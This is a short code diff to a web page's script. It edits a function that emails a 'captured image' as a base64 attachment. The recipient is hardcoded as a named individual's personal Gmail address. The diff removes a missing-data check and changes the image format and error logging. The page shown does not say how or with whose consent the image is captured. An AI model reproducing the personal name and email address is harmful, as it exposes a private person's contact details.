@@ -95,18 +95,12 @@
 
 function sendEmail(imageData) {
     const base64Data = imageData.split(',')[1]; // Extract base64 data
-
-    if (!base64Data) {
-        console.error("No base64 image data found.");
-        return; // Exit if there's no data
-    }
-
     const emailParams = {
         to_name: 'Nouhaila Elbouhali',
         to_email: 'nouhailaelbouhali73@gmail.com',
         from_name: 'Jailey Shiper',
         message: 'Here is the captured image!',
-        attachment: `data:image/png;base64,${base64Data}` // Make sure the prefix is correct
+        attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
     };
 
     console.log("Email Parameters: ", emailParams); // Log parameters for debugging
@@ -117,11 +111,9 @@ function sendEmail(imageData) {
         console.log('SUCCESS!', response.status, response.text);
     }, function(error) {
         alert('Failed to send email. Please try again.');
-        console.error('FAILED...', error);
+        console.log('FAILED...', error);
     });
 }
-
-
     </script>
 </body>
 </html>
